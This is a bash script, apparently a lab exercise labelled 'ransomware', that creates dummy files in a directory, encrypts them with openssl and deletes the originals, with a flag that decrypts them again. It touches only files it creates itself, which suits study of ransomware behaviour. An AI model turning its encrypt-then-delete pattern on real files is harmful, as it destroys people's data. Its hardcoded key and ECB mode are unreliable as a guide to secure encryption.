#1/bin/bash

############################################# USEFULL VARIABLES #############################################

NEW_FILES_INPUT='Created original file number '
DIRPATH=
CREATE_FILES=
ENCRYPT_FILES=
DECRYPT=
CREATED_FILES_ARRAY=()
ENCRUPTION_METHOD=aes-256-ecb
ENCRYPTION_KEY=mousakas

############################################# USEFULL FUNCTIONS #############################################

# --> print_message message mode
print_message() {
    if [[ "$2" == "error" ]]; then
        echo -e "\e[31m $1  \e[39m"
    elif [[ "$2" == "info" ]]; then
        echo -e "\e[96m $1  \e[39m"
    fi
}

print_usage() {
    echo "Usage: sh ransomware -flag -option [option argument] "
    echo ""
    echo "option:"
    echo "    p     The action's directory"
    echo "    c     The number of files the user wants to create"
    echo "    e     The number of files the user wants to create and encrypt"
    echo ""
    echo "flag:"
    echo "    h     Prints the help menu"
    echo "    d     Decrypts all the .encrypt files in the given directory"
    exit 1
}

check_args(){
    local dir=$DIRPATH
    local cFiles=$CREATE_FILES
    local eFiles=$ENCRYPT_FILES
    local dec=$DECRYPT

    # checking if directory defined, if not print usage
    if ! [ -n "$dir" ] ; then
	    print_usage
    # else
    #     echo "direction = $dir"
    fi
    # checking if any of the available actions defined, if not print usage
    if ! [ -n "$cFiles" ] && ! [ -n "$eFiles" ] && ! [ -n "$dec" ] ; then 
		print_usage
    # else
    #     echo "Number of encrypted files = $eFiles"
    #     echo "Number of created files = $cFiles"
    #     echo "DECRYPT = $dec" 
    fi
}

get_args(){
    while getopts "p:e:c:dh" opt; do
        case $opt in
            p)
                DIRPATH=$OPTARG/
                ;;
            e)
                ENCRYPT_FILES=$OPTARG
                ;;
            c)
                CREATE_FILES=$OPTARG
                ;;
            d)
                DECRYPT=1
                ;;
            h) 
                print_usage
                ;;
            \?)
                print_usage
                ;;

        esac
    done
}


create_x_files () {
    CREATED_FILES_ARRAY=()
    local limit=$1
    local files=1;
    while [[ $files -le $limit ]];
    do 
        local rnd=$RANDOM
        local fl=$DIRPATH'file_'$rnd.txt
        # echo $fl
        while  [ -f $fl ];
        do
            echo existing
            fl=$DIRPATH'file_'$RANDOM.txt
        done
        echo $NEW_FILES_INPUT$rnd. > $fl
        CREATED_FILES_ARRAY+=($fl)
        ((files = files + 1))
    done
}

encrypt_x_files () {
    create_x_files $ENCRYPT_FILES
    for file in "${CREATED_FILES_ARRAY[@]}";
    do 
        openssl enc -$ENCRUPTION_METHOD -pbkdf2 -in $file -out $file.encrypt -k $ENCRYPTION_KEY
        rm -f $file
    done
}

decrypt_files() {
    local decrypted_files=()
    find $DIRPATH -name "*.encrypt" -print0 > tmpfile
    while IFS=  read -r -d $'\0'; do
        output=$(sed 's/.encrypt//' <<< "$REPLY")
        openssl $ENCRUPTION_METHOD -pbkdf2 -in $REPLY -out $output -d -k $ENCRYPTION_KEY
        rm -f $REPLY 
    done < tmpfile
    rm -f tmpfile
}

############################################# EXECUTABLE #############################################


# rm *.txt *.encrypt
get_args "$@"
check_args


if [ -n "$CREATE_FILES" ]; then
    create_x_files $CREATE_FILES
fi
if [ -n "$ENCRYPT_FILES" ]; then
    encrypt_x_files
fi
if [ -n "$DECRYPT" ] ; then 
    decrypt_files
fi